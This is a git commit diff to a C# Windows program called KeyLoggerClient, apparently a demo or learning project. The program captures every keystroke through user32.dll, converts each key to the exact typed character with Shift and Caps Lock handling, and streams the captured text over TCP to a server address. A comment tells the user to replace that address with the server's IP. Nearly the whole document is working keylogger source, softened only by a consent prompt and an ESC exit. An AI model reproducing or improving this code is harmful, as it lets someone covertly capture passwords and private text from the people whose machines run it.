bcceccd5855fc62cae111a5b7885ba6e03590d5b
mark watson <markus.c.watson@gmail.com>
2024-12-18 10:16:51 -0400

    Refactor client to handle upper/lower case letters

--- KeyLoggerClient/Program.cs
+++ KeyLoggerClient/Program.cs
@@ -1,16 +1,25 @@
 ﻿using System;
-using System.IO;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Threading;
 
 namespace KeyLoggerClient
 {
     class Program
     {
-        // Import GetAsyncKeyState from user32.dll
         [DllImport("user32.dll")]
         public static extern short GetAsyncKeyState(int vKey);
+
+        [DllImport("user32.dll")]
+        public static extern int MapVirtualKey(int uCode, int uMapType);
+
+        [DllImport("user32.dll")]
+        public static extern short GetKeyState(int nVirtKey);
+
+        const int VK_SHIFT = 0x10;
+        const int VK_CAPITAL = 0x14;
+        const int MAPVK_VK_TO_CHAR = 2;
 
         static void Main(string[] args)
         {
@@ -19,7 +28,7 @@ namespace KeyLoggerClient
             Console.Write("Do you want to continue? (yes/no): ");
             string input = Console.ReadLine();
 
-            if (input?.ToLower() != "yes")
+            if (input?.ToLower() != "yes" && input?.ToLower() != "y")
             {
                 Console.WriteLine("Exiting program.");
                 return;
@@ -27,16 +36,11 @@ namespace KeyLoggerClient
 
             Console.WriteLine("Keylogger is now running. Press 'ESC' to stop.");
 
-            // Connect to the TCP server (ex. localhost:5000)
+            // Note: replace localhost ip with the server's IP address
             using TcpClient client = new TcpClient("127.0.0.1", 5000);
             using NetworkStream stream = client.GetStream();
 
             RunKeylogger(stream);
-        }
-
-        static bool KeyIsPressed(short key)
-        {
-            return (key & 0x8000) != 0;
         }
 
         static void RunKeylogger(NetworkStream stream)
@@ -51,10 +55,28 @@ namespace KeyLoggerClient
 
                     if (KeyIsPressed(keyState) && !keyStates[vKey])
                     {
-                        string key = ((ConsoleKey)vKey).ToString();
-                        byte[] data = System.Text.Encoding.ASCII.GetBytes(key + " ");
+                        string key;
 
-                        stream.Write(data, 0, data.Length);
+                        if (vKey == (int)ConsoleKey.Escape)
+                        {
+                            // note: in a real key logger, you would not exit the program on escape
+                            key = "Escape";
+                            Console.WriteLine("\nESC pressed. Keylogger stopped.");
+                            byte[] exitMessage = Encoding.ASCII.GetBytes(key + " ");
+                            stream.Write(exitMessage, 0, exitMessage.Length);
+                            return;
+                        }
+                        else
+                        {
+                            // For all other keys, use the mapping logic
+                            key = GetKeyString(vKey);
+                        }
+
+                        if (!string.IsNullOrEmpty(key))
+                        {
+                            byte[] data = Encoding.ASCII.GetBytes(key + " ");
+                            stream.Write(data, 0, data.Length);
+                        }
 
                         keyStates[vKey] = true;
 
@@ -72,6 +94,66 @@ namespace KeyLoggerClient
 
                 Thread.Sleep(10);
             }
+        }
+
+        static bool KeyIsPressed(short keyState)
+        {
+            return (keyState & 0x8000) != 0;
+        }
+
+        static string GetKeyString(int vKey)
+        {
+            // Map virtual key to character
+            int charCode = MapVirtualKey(vKey, MAPVK_VK_TO_CHAR);
+
+            if (charCode == 0) return null;
+
+            char keyChar = (char)charCode;
+
+            // Check for Shift key or Caps Lock
+            bool shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
+            bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
+
+            // Apply Shift or Caps Lock transformations
+            if (char.IsLetter(keyChar))
+            {
+                if (shiftPressed ^ capsLockOn) // XOR: Shift or Caps Lock, but not both
+                {
+                    keyChar = char.ToUpper(keyChar);
+                }
+                else
+                {
+                    keyChar = char.ToLower(keyChar);
+                }
+            }
+            else if (shiftPressed)
+            {
+                switch (keyChar)
+                {
+                    case '1': keyChar = '!'; break;
+                    case '2': keyChar = '@'; break;
+                    case '3': keyChar = '#'; break;
+                    case '4': keyChar = '$'; break;
+                    case '5': keyChar = '%'; break;
+                    case '6': keyChar = '^'; break;
+                    case '7': keyChar = '&'; break;
+                    case '8': keyChar = '*'; break;
+                    case '9': keyChar = '('; break;
+                    case '0': keyChar = ')'; break;
+                    case '-': keyChar = '_'; break;
+                    case '=': keyChar = '+'; break;
+                    case '[': keyChar = '{'; break;
+                    case ']': keyChar = '}'; break;
+                    case '\\': keyChar = '|'; break;
+                    case ';': keyChar = ':'; break;
+                    case '\'': keyChar = '"'; break;
+                    case ',': keyChar = '<'; break;
+                    case '.': keyChar = '>'; break;
+                    case '/': keyChar = '?'; break;
+                }
+            }
+
+            return keyChar.ToString();
         }
     }
 }
